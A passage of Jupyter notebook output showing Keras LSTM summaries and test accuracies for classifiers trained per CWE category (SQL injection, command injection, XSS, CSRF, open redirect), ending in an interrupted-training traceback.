              "│ dense_9 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                 │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-89: 85.71%\n",
            "\n",
            "Training model for CWE-77...\n",
            "Model summary for CWE-77:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_10\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_10\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_10 (\u001b[38;5;33mLSTM\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_10 (\u001b[38;5;33mDense\u001b[0m)                │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_10 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_10 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-77: 85.71%\n",
            "\n",
            "Training model for CWE-79...\n",
            "Model summary for CWE-79:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_11\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_11\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_11 (\u001b[38;5;33mLSTM\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_11 (\u001b[38;5;33mDense\u001b[0m)                │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_11 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_11 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-79: 100.00%\n",
            "\n",
            "Training model for CWE-352...\n",
            "Model summary for CWE-352:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_12\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_12\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_12 (\u001b[38;5;33mLSTM\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_12 (\u001b[38;5;33mDense\u001b[0m)                │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_12 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_12 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-352: 71.43%\n",
            "\n",
            "Training model for CWE-601...\n",
            "Model summary for CWE-601:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_13\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_13\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_13 (\u001b[38;5;33mLSTM\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_13 (\u001b[38;5;33mDense\u001b[0m)                │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_13 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_13 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "ERROR:root:Internal Python error in the inspect module.\n",
            "Below is the traceback from this internal error.\n",
            "\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/IPython/core/interactiveshell.py\", line 3553, in run_code\n",
            "    exec(code_obj, self.user_global_ns, self.user_ns)\n",
            "  File \"/tmp/ipython-input-1563915152.py\", line 69, in <cell line: 0>\n",
            "    history_binary = model_binary.fit(X_train_binary, y_train_binary, epochs=15, batch_size=16, validation_split=0.2, verbose=0)\n",
            "                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/utils/traceback_utils.py\", line 117, in error_handler\n",
            "    return fn(*args, **kwargs)\n",
            "           ^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\", line 401, in fit\n",
            "    val_logs = self.evaluate(\n",
            "               ^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/utils/traceback_utils.py\", line 117, in error_handler\n",
            "    return fn(*args, **kwargs)\n",
            "           ^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\", line 487, in evaluate\n",
            "    for step, iterator in epoch_iterator:\n",
            "                          ^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\", line 740, in __next__\n",
            "    return next(self._epoch_iterator)\n",
            "           ^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/keras/src/trainers/epoch_iterator.py\", line 111, in _enumerate_iterator\n",
            "    self._current_iterator = iter(self._get_iterator())\n",
            "                             ^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/dataset_ops.py\", line 501, in __iter__\n",
            "    return iterator_ops.OwnedIterator(self)\n",
            "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/iterator_ops.py\", line 709, in __init__\n",
            "    self._create_iterator(dataset)\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/iterator_ops.py\", line 748, in _create_iterator\n",
            "    gen_dataset_ops.make_iterator(ds_variant, self._iterator_resource)\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/tensorflow/python/ops/gen_dataset_ops.py\", line 3478, in make_iterator\n",
            "    _result = pywrap_tfe.TFE_Py_FastPathExecute(\n",
            "              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "KeyboardInterrupt\n",
            "\n",
            "During handling of the above exception, another exception occurred:\n",
            "\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/IPython/core/interactiveshell.py\", line 2099, in showtraceback\n",
            "    stb = value._render_traceback_()\n",
            "          ^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "AttributeError: 'KeyboardInterrupt' object has no attribute '_render_traceback_'\n",
            "\n",
            "During handling of the above exception, another exception occurred:\n",
            "\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\", line 1101, in get_records\n",
            "    return _fixed_getinnerframes(etb, number_of_lines_of_context, tb_offset)\n",
            "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\", line 248, in wrapped\n",
            "    return f(*args, **kwargs)\n",
            "           ^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\", line 293, in _fixed_getinnerframes\n",
            "    aux = traceback.extract_tb(etb)\n",
            "          ^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/lib/python3.12/traceback.py\", line 74, in extract_tb\n",
            "    return StackSummary._extract_from_extended_frame_gen(\n",
            "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/lib/python3.12/traceback.py\", line 418, in _extract_from_extended_frame_gen\n",
            "    for f, (lineno, end_lineno, colno, end_colno) in frame_gen:\n",
            "                                                     ^^^^^^^^^\n",
            "  File \"/usr/lib/python3.12/traceback.py\", line 355, in _walk_tb_with_full_positions\n",
            "    positions = _get_code_position(tb.tb_frame.f_code, tb.tb_lasti)\n",
            "                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "  File \"/usr/lib/python3.12/traceback.py\", line 369, in _get_code_position\n",
            "    return next(itertools.islice(positions_gen, instruction_index // 2, None))\n",
            "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
            "KeyboardInterrupt\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "TypeError",
          "evalue": "object of type 'NoneType' has no len()",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
            "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
